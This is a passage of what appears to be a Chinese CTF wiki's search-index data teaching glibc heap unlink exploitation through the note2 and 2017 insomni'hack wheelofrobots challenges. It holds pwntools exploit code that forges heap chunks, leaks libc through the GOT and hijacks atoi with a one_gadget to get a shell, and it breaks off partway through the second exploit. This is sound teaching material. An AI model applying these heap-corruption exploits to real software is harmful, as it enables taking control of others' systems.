\u4ed4\u7ec6\u5206\u6790\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898 \u5728 create \u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8bb0\u5f55 note \u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u8be5\u5927\u5c0f\u4f1a\u7528\u4e8e\u63a7\u5236\u8bfb\u53d6 note \u7684\u5185\u5bb9\u3002\u81ea\u5b9a\u4e49\u51fd\u6570\u4e2d\u7684\u5faa\u73af\u53d8\u91cf i \u5b9a\u4e49\u4e3a int \u578b\uff0c\u4f46\u662f\u7528\u4e8e\u6bd4\u8f83\u7684\u4f20\u5165\u53c2\u6570\u5b9a\u4e49\u662f unsigned int \u3002 for ( i = 0L L ; length - 1 > i ; ++ i ) // \u9884\u7559\u6700\u540e\u4e00\u4f4d\u5199\u5165\\x00 // \u5806\u6ea2\u51fa\uff1alength\u4e3aunsigned int\uff0c\u5f53length\u7b49\u4e8e0\u65f6\uff0c\u7ed3\u679c\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u6574\u6570 { v7 = read ( 0 , & buf , 1uLL ); if ( v7 <= 0 ) exit ( -1 ); // \u8bfb\u5165\u9519\u8bef\u9000\u51fa\u7a0b\u5e8f if ( buf == v4 ) // \u5224\u65ad\u7ed3\u675f\u7b26 break ; * ( _BYTE * )( i + ptr ) = buf ; } * ( _BYTE * )( ptr + i ) = 0 ; // \u5199\u5165\u7ed3\u675f\u7b26\\x00 return i ; \u5728 C \u8bed\u8a00\u4e2d\uff0c\u6211\u4eec\u7528 int \u548c unsigned int \u4e24\u79cd\u6570\u636e\u7c7b\u578b\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u4f1a\u81ea\u52a8\u8f6c\u6362\u4e3a unsigned int\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u8f93\u5165 size \u4e3a 0 \u65f6\uff0cglibc \u6839\u636e\u5176\u89c4\u5b9a\uff0c\u4f1a\u5206\u914d 0x20 \u4e2a\u5b57\u8282\uff0c\u5373\uff1aprez_size,size,fd,bk\u3002\u56e0\u4e3a size \u4e3a 0 \uff0c\u7136\u540e\u9000\u51fa\u5224\u65ad\u6761\u4ef6\u4e3a\uff1asize-1 \uff0c\u90a3\u4e48\u9000\u51fa\u6761\u4ef6\u5c31\u6052\u6ee1\u8db3\uff0c\u7a0b\u5e8f\u8bfb\u53d6\u7684\u957f\u5ea6\u5c31\u4e0d\u53d7\u5230\u9650\u5236\uff0c\u6545\u800c\u4f1a\u4ea7\u751f\u5806\u6ea2\u51fa\u3002 \u7a0b\u5e8f\u5728\u6bcf\u6b21\u7f16\u8f91 note \u65f6\uff0c\u90fd\u4f1a\u7533\u8bf7 0xa0 \u5927\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u5728 free \u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3a NULL\uff0c\u5bf9\u505a\u9898\u6ca1\u6709\u5f71\u54cd\u3002\u4f46\u662f\u6ce8\u610f\u4e00\u4e0b\u6bcf\u6b21\u7f16\u8f91\u65f6\u53ef\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u662f\u5426\u80fd\u88ab\u5229\u7528\u3002\uff08\u540e\u9762\u6709\u8be6\u89e3\uff09","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"Pwn/glibc-heap/unlink/#_11","text":"\u5728\u7f16\u8f91 create \u65f6\u8c03\u7528\uff0c\u5b58\u5728\u5199\u5165\u957f\u5ea6\u53ef\u63a7\uff0c\u9020\u6210\u5806\u6ea2\u51fa\u3002 for ( i = 0L L ; length - 1 > i ; ++ i ) // \u9884\u7559\u6700\u540e\u4e00\u4f4d\u5199\u5165\\x00 // \u5806\u6ea2\u51fa\uff1alength\u4e3aunsigned int\uff0c\u5f53length\u7b49\u4e8e0\u65f6\uff0c\u7ed3\u679c\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u6574\u6570 { v7 = read ( 0 , & buf , 1uLL ); if ( v7 <= 0 ) exit ( -1 ); // \u8bfb\u5165\u9519\u8bef\u9000\u51fa\u7a0b\u5e8f if ( buf == v4 ) // \u5224\u65ad\u7ed3\u675f\u7b26 break ; * ( _BYTE * )( i + ptr ) = buf ; } * ( _BYTE * )( ptr + i ) = 0 ; // \u5199\u5165\u7ed3\u675f\u7b26\\x00 return i ; \u9020\u6210\u539f\u56e0\u524d\u9762\u6709\u8bf4\uff0c\u8fd9\u91cc\u6982\u8ff0\u4e00\u4e0b\uff1alength \u4e3a unsigned int \u5f53\u4e0e int \u7c7b\u578b\u8fd0\u7b97\u65f6\uff0c\u7ed3\u679c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u6362\u4e3a unsigned int \uff0c\u90a3\u4e48 length - 1 \u5c31\u80fd\u4ea7\u751f\u4e00\u4e2a\u5de8\u5927\u6b63\u6570\uff0c\u4ece\u800c\u65e0\u9650\u8f93\u5165\u3002 \u8fd8\u6709\u4e00\u4e2a\u5730\u65b9\u5c31\u662f edit \u529f\u80fd\u3002\u4e3b\u8981\u903b\u8f91\u662f\u521b\u5efa\u4e00\u4e2a 0xa0 \u7684\u5806\u5757\uff0c\u7528\u6765\u5b58\u653e tmp \u6570\u636e\u3001\u51c6\u5907\u5199\u5165\u88ab\u4fee\u6539 chunk \u7684\u6570\u636e\uff0c\u91cd\u70b9\u662f**\u6bcf\u6b21\u8f93\u5165\u4e34\u65f6\u6570\u636e\u957f\u5ea6\u90fd\u662f 0x90 ** my_input (( __int64 )( v8 + 15 ), 0x90LL , 10 ); \u4e00\u5f00\u59cb\u770b\u4e0a\u53bb\u662f\u5b58\u5728\u6ea2\u51fa\uff0c\u5047\u5982 chunk size \u4e3a 0x80 \uff0c\u5c31\u80fd\u6ea2\u51fa 0x90 \uff1f\u4e0d\u60f3\u591a\u4e86\uff0c\u5728\u8c03\u8bd5\u540e\u53d1\u73b0\u4e0d\u4f1a\u6ea2\u51fa\u7684\uff0c\u56e0\u4e3a\u6709\u8fd9\u4e00\u53e5\u8bdd\uff1a v1 [ chunk_size - strlen ( & dest ) + 14 ] = 0 ; \u7a0b\u5e8f\u4f1a\u5728 chunk size \u4e0a\u9650\u7684\u5730\u65b9\u5199\u5165\u4e00\u4e2a \\x00 \uff0c\u4ece\u800c\u907f\u514d\u4e86\u6ea2\u51fa\u3002\u6240\u4ee5\u6f0f\u6d1e\u5229\u7528\u70b9\u5c31\u53ea\u6709\u4e00\u4e2a\u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/glibc-heap/unlink/#_12","text":"\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u53d1\u73b0\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u4e3b\u8981\u5229\u7528\u4e86 fastbin \u7684\u673a\u5236\u3001unlink \u7684\u673a\u5236\u3002 \u521b\u5efa 3 \u4e2a\u5806\u5757\uff0cchunk1 \u4e3a fastbin \uff0c\u5176\u4f59\u662f unsorted bin \u3002\u521b\u5efa chunk 0 \u5199\u5165\u6570\u636e\u65f6\uff0c\u5c06 fake chunk \u4e5f\u5199\u5165\u3002 \u91ca\u653e chunk 1 \uff0c \u7136\u540e\u518d\u6b21\u7533\u8bf7\u76f8\u540c\u5927\u5c0f\u7684 chunk \uff0c\u7531\u4e8e fastbin \u673a\u5236\uff0c\u4f1a\u4f7f\u7528\u539f\u6765 chunk 1 \u7684\u5730\u5740\u3002\u7533\u8bf7 size \u4e3a 0 \uff0c\u89e6\u53d1\u6f0f\u6d1e\u4fee\u6539 chunk 2 \u7684 prez_size \u548c prez_inuse \u3002 \u91ca\u653e chunk 2 \u89e6\u53d1 unlink hijack chunk list \u6307\u9488\u5217\u8868\u3002","title":"\u57fa\u672c\u601d\u8def"},{"location":"Pwn/glibc-heap/unlink/#_13","text":"\u9996\u5148\uff0c\u6211\u4eec\u5148\u628a note \u53ef\u80fd\u7684\u57fa\u672c\u64cd\u4f5c\u5217\u4e3e\u51fa\u6765\u3002 # coding=UTF-8 from pwn import * p = process ( './note2' ) elf = ELF ( './note2' ) libc = ELF ( '/lib/x86_64-linux-gnu/libc.so.6' ) context . log_level = 'debug' def newnote ( length , content ): p . recvuntil ( 'option--->>' ) p . sendline ( '1' ) p . recvuntil ( '(less than 128)' ) p . sendline ( str ( length )) p . recvuntil ( 'content:' ) p . sendline ( content ) def shownote ( id ): p . recvuntil ( 'option--->>' ) p . sendline ( '2' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) def editnote ( id , choice , s ): p . recvuntil ( 'option--->>' ) p . sendline ( '3' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id )) p . recvuntil ( '2.append]' ) p . sendline ( str ( choice )) p . sendline ( s ) def deletenote ( id ): p . recvuntil ( 'option--->>' ) p . sendline ( '4' ) p . recvuntil ( 'note:' ) p . sendline ( str ( id ))","title":"\u57fa\u672c\u64cd\u4f5c"},{"location":"Pwn/glibc-heap/unlink/#note","text":"\u6784\u9020\u4e09\u4e2a chunk\uff0cchunk0\u3001chunk1 \u548c chunk2 payload = p64 ( 0 ) + p64 ( 0xa1 ) payload += p64 ( chunk_ptr - 0x18 ) + p64 ( chunk_ptr - 0x10 ) newnote ( 0x80 , payload ) newnote ( 0 , 'b' * 8 ) newnote ( 0x80 , 'c' * 8 ) \u5176\u4e2d\u8fd9\u4e09\u4e2a chunk \u7533\u8bf7\u65f6\u7684\u5927\u5c0f\u5206\u522b\u4e3a 0x80\uff0c0\uff0c0x80 \u3002chunk1 \u867d\u7136\u7533\u8bf7\u7684\u5927\u5c0f\u4e3a 0\uff0c\u4f46\u662f glibc \u7684\u8981\u6c42 chunk \u5757\u81f3\u5c11\u53ef\u4ee5\u5b58\u50a8 4 \u4e2a\u5fc5\u8981\u7684\u5b57\u6bb5 (prev_size,size,fd,bk)\uff0c\u6240\u4ee5\u4f1a\u5206\u914d 0x20 \u7684\u7a7a\u95f4\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u65e0\u7b26\u53f7\u6574\u6570\u7684\u6bd4\u8f83\u95ee\u9898\uff0c\u53ef\u4ee5\u4e3a\u8be5 note \u8f93\u5165\u4efb\u610f\u957f\u7684\u5b57\u7b26\u4e32\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cchunk0 \u4e2d\u4e00\u5171\u6784\u9020\u4e86\u4e24\u4e2a chunk chunk ptr[0]\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86 unlink \u65f6\u4fee\u6539\u5bf9\u5e94\u7684\u503c\u3002 chunk ptr[0]'s nextchunk\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86\u4f7f\u5f97 unlink \u65f6\u7684\u7b2c\u4e00\u4e2a\u68c0\u67e5\u6ee1\u8db3\u3002 // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ \u5f53\u6784\u9020\u5b8c\u4e09\u4e2a note \u540e\uff0c\u5806\u7684\u57fa\u672c\u6784\u9020\u5982\u56fe 1 \u6240\u793a\u3002 +-----------------+ high addr | ... | +-----------------+ | 'b'*8 | ptr[2]-----------> +-----------------+ | size=0x91 | +-----------------+ | prevsize | +-----------------|------------ | unused | +-----------------+ | 'a'*8 | ptr[1]----------> +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------|------------- | unused | +-----------------+ | \u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026 | fake ptr[0] chunk's nextchunk----->+-----------------+ | \u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026 | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0xa1 | chunk 0 +-----------------+ | 0 | ptr[0]----------> +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr pwndbg> x /40gx 0x603000 0x603000: 0x0000000000000000 0x0000000000000091 0x603010: 0x0000000000000000 0x00000000000000a1 0x603020: 0x0000000000602108 0x0000000000602110 0x603030: 0x0000000000000000 0x0000000000000000 0x603040: 0x0000000000000000 0x0000000000000000 0x603050: 0x0000000000000000 0x0000000000000000 0x603060: 0x0000000000000000 0x0000000000000000 0x603070: 0x0000000000000000 0x0000000000000000 0x603080: 0x0000000000000000 0x0000000000000000 0x603090: 0x0000000000000000 0x0000000000000021 0x6030a0: 0x6262626262626262 0x0000000000000000 0x6030b0: 0x0000000000000000 0x0000000000000091 0x6030c0: 0x6363636363636363 0x0000000000000000 0x6030d0: 0x0000000000000000 0x0000000000000000","title":"\u751f\u6210\u4e09\u4e2a note"},{"location":"Pwn/glibc-heap/unlink/#chunk1-chunk2-chunk2","text":"\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b deletenote ( 1 ) payload = 'a' * 0x10 payload += p64 ( 0xa0 ) + p64 ( 0x90 ) newnote ( 0 , payload ) deletenote ( 2 ) payload = 'a' * 0x18 + p64 ( atoi_got ) editnote ( 0 , 1 , payload ) shownote ( 0 ) \u9996\u5148\u91ca\u653e chunk1\uff0c\u7531\u4e8e\u8be5 chunk \u5c5e\u4e8e fastbin\uff0c\u6240\u4ee5\u4e0b\u6b21\u5728\u7533\u8bf7\u7684\u65f6\u5019\u4ecd\u7136\u4f1a\u7533\u8bf7\u5230\u8be5 chunk\uff0c\u540c\u65f6\u7531\u4e8e\u4e0a\u9762\u6240\u8bf4\u7684\u7c7b\u578b\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u5b57\u7b26\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8986\u76d6 chunk2\uff0c\u8986\u76d6\u4e4b\u540e\u5982\u56fe 2 \u6240\u793a\u3002 +-----------------+high addr | ... | +-----------------+ | '\\x00'+'b'*7 | ptr[2]-----------> +-----------------+ chunk 2 | size=0x90 | +-----------------+ | 0xa0 | +-----------------|------------ | 'a'*8 | +-----------------+ | 'a'*8 | ptr[1]----------> +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------|------------- | ... | +-----------------+ | ... | fake ptr[0] chunk's nextchunk----->+-----------------+ | ... | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0xa1 | chunk 0 +-----------------+ | '0' *8 | ptr[0]----------> +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr \u56fe2 pwndbg> x /40gx 0x603000 0x603000: 0x0000000000000000 0x0000000000000091 0x603010: 0x0000000000000000 0x00000000000000a1 0x603020: 0x0000000000602108 0x0000000000602110 0x603030: 0x0000000000000000 0x0000000000000000 0x603040: 0x0000000000000000 0x0000000000000000 0x603050: 0x0000000000000000 0x0000000000000000 0x603060: 0x0000000000000000 0x0000000000000000 0x603070: 0x0000000000000000 0x0000000000000000 0x603080: 0x0000000000000000 0x0000000000000000 0x603090: 0x0000000000000000 0x0000000000000021 0x6030a0: 0x6161616161616161 0x6161616161616161 0x6030b0: 0x00000000000000a0 0x0000000000000090 0x6030c0: 0x6363636363636300 0x0000000000000000 \u8be5\u8986\u76d6\u4e3b\u8981\u662f\u4e3a\u4e86\u91ca\u653e chunk2 \u7684\u65f6\u5019\u53ef\u4ee5\u540e\u5411\u5408\u5e76\uff08\u5408\u5e76\u4f4e\u5730\u5740\uff09\uff0c\u5bf9 chunk0 \u4e2d\u865a\u62df\u6784\u9020\u7684 chunk \u8fdb\u884c unlink\u3002\u5373\u5c06\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e3a unlink(ptr[0])\uff0c\u540c\u65f6\u6211\u4eec\u6240\u6784\u9020\u7684 fakebk \u548c fakefd \u6ee1\u8db3\u5982\u4e0b\u7ea6\u675f if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ unlink \u6210\u529f\u6267\u884c\uff0c\u4f1a\u5bfc\u81f4 ptr[0] \u6240\u5b58\u50a8\u7684\u5730\u5740\u53d8\u4e3a fakebk\uff0c\u5373 ptr-0x18\u3002","title":"\u91ca\u653e chunk1 - \u8986\u76d6 chunk2 - \u91ca\u653e chunk2"},{"location":"Pwn/glibc-heap/unlink/#libc","text":"\u4ee3\u7801\u5982\u4e0b payload = 'a' * 0x18 + p64 ( atoi_got ) editnote ( 0 , 1 , payload ) shownote ( 0 ) p . recvuntil ( \"Content is \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) libc_base = leak_addr - libc . symbols [ 'atoi' ] system_addr = libc_base + libc . symbols [ 'system' ] onegadget = libc_base + 0xf1207 log . info ( \"leak_addr:\" + hex ( leak_addr )) log . info ( \"libc_base:\" + hex ( libc_base )) log . info ( \"system_addr:\" + hex ( system_addr )) log . info ( \"onegadget:\" + hex ( onegadget )) \u6211\u4eec\u4fee\u6539 ptr[0] \u7684\u5185\u5bb9\u4e3a ptr \u7684\u5730\u5740 - 0x18\uff0c\u6240\u4ee5\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 note0 \u65f6\uff0c\u53ef\u4ee5\u8986\u76d6 ptr[0] \u7684\u5185\u5bb9\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u8986\u76d6\u4e3a atoi \u7684\u5730\u5740\u3002 \u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u67e5\u770b note 0 \u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u67e5\u770b\u7684\u5c31\u662f atoi \u7684\u5730\u5740\u3002","title":"\u6cc4\u9732 libc \u5730\u5740"},{"location":"Pwn/glibc-heap/unlink/#atoi-got","text":"payload = p64 ( onegadget ) editnote ( 0 , 1 , payload ) \u7531\u4e8e\u6b64\u65f6 ptr[0] \u7684\u5730\u5740 got \u8868\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u8be5 note\uff0c\u8986\u76d6\u4e3a one_gadget \u5730\u5740\u3002","title":"\u4fee\u6539 atoi got"},{"location":"Pwn/glibc-heap/unlink/#get-shell","text":"p . sendline ( 'skye' ) p . interactive () \u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u8c03\u7528 atoi \uff0c\u5176\u5b9e\u8c03\u7528\u7684\u5c31\u662f one_gadget \uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u62ff\u5230 shell \u4e86\u3002","title":"get shell"},{"location":"Pwn/glibc-heap/unlink/#_14","text":"\u9898\u76ee\u8003\u70b9\uff1aunlink\u3001fastbin \u673a\u5236\u3001\u6570\u5b57\u7c7b\u578b\u8fd0\u7b97\u8f6c\u6362\u3002 unlink \u548c fastbin \u4e0e\u4e0a\u9762\u5b66\u4e60\u7684\u5dee\u522b\u4e0d\u5927\uff0c\u90fd\u662f\u5229\u7528 unlink \u63a7\u5236 chunk list \u4fee\u6539\u5f53\u4e2d\u7684 \u5806\u6307\u9488\u5730\u5740\uff0c\u5b9e\u73b0\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u8bfb\u5199\u3002 \u4e00\u5f00\u59cb\u5728\u8fd9\u6761\u9898\u76ee\u5361\u4f4f\u5c31\u662f\u5728\uff0cedit \u8fd9\u4e2a\u529f\u80fd\u4e00\u5ea6\u4ee5\u4e3a\u5b58\u5728\u5806\u6ea2\u51fa\u3002\u6700\u540e\u770b wp \u624d\u77e5\u9053\u5b58\u5728 unsigned int \u4e0e int \u8fd0\u7b97\u7c7b\u578b\u8f6c\u6362\u7684\u903b\u8f91\u6f0f\u6d1e\uff0c\u627e\u5230\u6ea2\u51fa\u70b9\u5c31\u597d\u505a\u4e86\u3002","title":"\u603b\u7ed3"},{"location":"Pwn/glibc-heap/unlink/#2017-insomnihack-wheelofrobots","text":"","title":"2017 insomni'hack wheelofrobots"},{"location":"Pwn/glibc-heap/unlink/#_15","text":"wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u52a8\u6001\u94fe\u63a5 64 \u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 canary \u4fdd\u62a4\u4e0e nx \u4fdd\u62a4\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Pwn/glibc-heap/unlink/#_16","text":"\u5927\u6982\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u77e5\uff0c\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u673a\u5668\u4eba\u8f6e\u5b50\u7684\u6e38\u620f\uff0c\u673a\u5668\u4eba\u4e00\u5171\u9700\u8981\u6dfb\u52a0 3 \u4e2a\u8f6e\u5b50\u624d\u80fd\u542f\u52a8\u3002 \u7a0b\u5e8f\u975e\u5e38\u4f9d\u8d56\u7684\u4e00\u4e2a\u529f\u80fd\u662f\u8bfb\u53d6\u6574\u6570\uff0c\u8be5\u51fd\u6570 read_num \u662f\u8bfb\u53d6\u6700\u957f\u4e3a 4 \u5b57\u8282\u7684\u5185\u5bb9\uff0c\u7136\u540e\u5c06\u5176\u8f6c\u5316\u4e3a int \u7c7b\u578b\u8fd4\u56de\u3002 \u7a0b\u5e8f\u57fa\u672c\u529f\u80fd\uff1a\u5806\u589e\u5220\u67e5\u6539\u3002 add \u6700\u591a\u80fd\u7533\u8bf7 3 \u4e2a\u5806\u5757\u3002\u6bcf\u79cd\u8f6e\u5b50\u7684\u521b\u5efa\u7b56\u7565\u4e0d\u540c\uff0c\u4e3b\u8981\u786e\u4fdd\u662f\u7533\u8bf7\u5927\u5c0f\u7684\u9650\u5236\u4ee5\u53ca\u662f\u5426\u56fa\u5b9a\u5927\u5c0f\u3002 start_robot \u968f\u673a\u9009\u62e9\u4e00\u4e2a\u8f6e\u5b50\uff08\u5806\uff09\u7684\u5185\u5bb9\u8fdb\u884c\u8f93\u51fa\uff0c\u7136\u540e\u9000\u51fa\u7a0b\u5e8f\u3002 change \u6839\u636e\u6bcf\u4e2a chunk size \u4fee\u6539 chunk \u5185\u5bb9","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/unlink/#_17","text":"","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/unlink/#off-by-one","text":"add \u9009\u62e9\u6dfb\u52a0\u7684\u8f6e\u5b50\u65f6\uff0c\u8c03\u7528 read_num \u6700\u957f\u53ef\u4ee5\u5199\u5165 4 \u5b57\u8282\uff0c\u6700\u540e 1 \u5b57\u8282\u4f1a\u8986\u76d6 bender_inuse \uff0c\u6784\u6210\u4e86 off-by-one \u6f0f\u6d1e\u3002 .bss:0000000000603110 choice db ? ; ; DATA XREF: add+3A\u2191o .bss:0000000000603110 ; add+49\u2191o ... .bss:0000000000603111 db ? ; .bss:0000000000603112 db ? ; .bss:0000000000603113 db ? ; .bss:0000000000603114 bender_inuse dd ? ; DATA XREF: add:loc_400EE0\u2191r","title":"off-by-one"},{"location":"Pwn/glibc-heap/unlink/#_18","text":"add \u6dfb\u52a0 destructor \u8f6e\u5b50\uff08\u7b2c6\u4e2a\uff09\u65f6\uff0csize \u662f\u6b63\u5e38\u4ea7\u751f\u7684\uff1a destructor = calloc(1uLL, 20 * v5); \uff0c\u6ca1\u6709\u5bf9 v5 \u5927\u5c0f\u8fdb\u884c\u9650\u5236\uff0c\u5177\u4f53\u53ef\u4ee5\u5bf9\u6bd4\u7b2c 3 \u4e2a\u8f6e\u5b50\u3002read_num \u5b9a\u4e49\u8fd4\u56de\u503c\u4e3a int \uff0cv5 \u5b9a\u4e49\u4e3a unsigned int \uff0c\u53ea\u8981\u8bfb\u53d6\u7684\u6570\u4e3a\u8d1f\u6570\uff0c\u90a3\u4e48\u5728\u7533\u8bf7 calloc(1uLL, 20 * v5); \u65f6\u5c31\u53ef\u80fd\u5bfc\u81f4 20*v5 \u6ea2\u51fa\u3002\u4e0e\u6b64\u540c\u65f6\uff0c destructor_size = v5 \u4f1a\u5f88\u5927\uff0cdestructor_size \u5b9a\u4e49\u4e3a __int64 \u5373 long long int \u6709\u7b26\u53f7 64 \u4f4d\u6574\u6570\uff0cv5 \u5f3a\u5236\u8d4b\u503c\u7ed9\u5b83\u4f1a\u4f9d\u7136\u4e3a\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u6b63\u6570\u3002","title":"\u5806\u6ea2\u51fa"},{"location":"Pwn/glibc-heap/unlink/#uaf","text":"free chunk \u53ea\u662f\u91ca\u653e\u5185\u5b58\uff0c\u6ca1\u6709\u5c06\u5bf9\u5e94\u6307\u9488\u6e05\u7a7a\uff0csize \u4f4d\u4e5f\u6ca1\u6709\u6e05\u7a7a\u3002","title":"UAF"},{"location":"Pwn/glibc-heap/unlink/#_19","text":"\u6784\u9020\u4efb\u610f\u8bfb\u5199\u6307\u9488\u6bd4\u8f83\u7ed5\uff0c\u540e\u9762\u5c31\u662f\u524d\u9762\u7684 unlink \u64cd\u4f5c\u3002 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528 off by one \u6f0f\u6d1e\u4e0e fastbin attack \u5206\u914d chunk \u5230 0x603138\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236 destructor_size \u7684\u5927\u5c0f\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u8f6e\u5b50 1 tinny \u5206\u914d\u5230\u8fd9\u91cc\u3002 \u8fd9\u91cc\u662f\u4e00\u5b9a\u8981 destructor \u8fd9\u4e2a\u8f6e\u5b50\uff0c\u63a7\u5236\u5176\u4ed6\u8f6e\u5b50\u7684 size \u503c\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u4e3b\u8981\u662f\u5426\u80fd bypass fastbin \u7684\u68c0\u67e5\u5c31\u884c\u3002 fastbin attack \u5c06 1 tinny \u6307\u9488\u6307\u5411 destructor_size \uff0c\u540e\u7eed\u901a\u8fc7 edit 1 tinny \u4fee\u6539 destructor_size \u3002 # add a fastbin chunk 0x20 and free it # fastbin \u6307\u9488\u6307\u5411\uff1a2 bender->NULL add ( 2 , 1 ) # 2 bender remove ( 2 ) # off-by-one \u8986\u5199 idx2 inuse \u4e3a 1 \u8ba9\u6211\u4eec\u80fd\u7f16\u8f91 overflow_benderinuse ( ' \\x01 ' ) # \u8986\u5199 fd 2 0x603138, point to 2 bender's size,\u540e\u9762\u4f2a\u9020\u5806fd\u5c31\u662fdestructor_size # now fastbin 0x20, idx2->0x603138->NULL change ( 2 , p64 ( 0x603138 )) # off-by-one \u8986\u5199 idx2 inuse \u4e3a 1 # \u8ba9\u6211\u4eec\u518d\u4e00\u6b21\u7533\u8bf7 2 bender overflow_benderinuse ( ' \\x00 ' ) # add 2 bender again, fastbin 0x603138->NULL # \u5c06\u539f\u6765 2 bender \u7a7a\u95f4\u7533\u8bf7\u51fa\u6765 add ( 2 , 1 ) # in order to malloc chunk at 0x603138 # \u7ed5\u8fc7fastbin size \u68c0\u67e5\uff1a\u5c06size\u4f4d\u4f2a\u9020\u4e00\u4e2afastbin\u8303\u56f4\u7684\u503c # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 # 0x603140 \u662f 3 Devil \u7684size\u4f4d\uff0c\u7533\u8bf7fastbin\u8303\u56f4\u5373\u53ef add ( 3 , 0x20 ) # trigger malloc, set tinny point to 0x603148 add ( 1 ) # \u91ca\u653e\u65e0\u7528\u5806 # wheels must <= 3 # only save tinny(0x603138) remove ( 2 ) remove ( 3 ) \u5206\u522b\u5206\u914d\u5408\u9002\u5927\u5c0f\u7684\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u5176\u4e2d\u5305\u62ec destructor\u3002\u501f\u52a9\u4e0a\u9762\u53ef\u4ee5\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u5bf9 destructor \u5bf9\u5e94\u7684 chunk \u8fdb\u884c\u6ea2\u51fa\uff0c\u5c06\u5176\u6ea2\u51fa\u5230\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9 0x6030E8 \u5904 fake chunk \u8fdb\u884c unlink \u7684\u6548\u679c\uff0c\u8fd9\u65f6 bss \u6bb5\u7684 destructor \u6307\u5411 0x6030D0\u3002\u4ece\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u5b9e\u73b0\u8986\u76d6 bss \u6bb5\u51e0\u4e4e\u6240\u6709\u7684\u5185\u5bb9\u3002 unlink \u5c06 6 destructor \u7684\u6307\u9488\u6307\u5411 0x06030E8 - 0x18 # alloc 6 destructor size 60->0x50, chunk content 0x40 add ( 6 , 3 ) # alloc 3 devil, size=20*7=140, bigger than fastbin add ( 3 , 7 ) # edit destructor's size to 1000 by tinny change ( 1 , p64 ( 1000 )) # place fake chunk at destructor's pointer fakechunk_addr = 0x6030E8 fakechunk = p64 ( 0 ) + p64 ( 0x20 ) + p64 ( fakechunk_addr - 0x18 ) + p64 ( fakechunk_addr - 0x10 ) + p64 ( 0x20 ) fakechunk = fakechunk . ljust ( 0x40 , 'a' ) 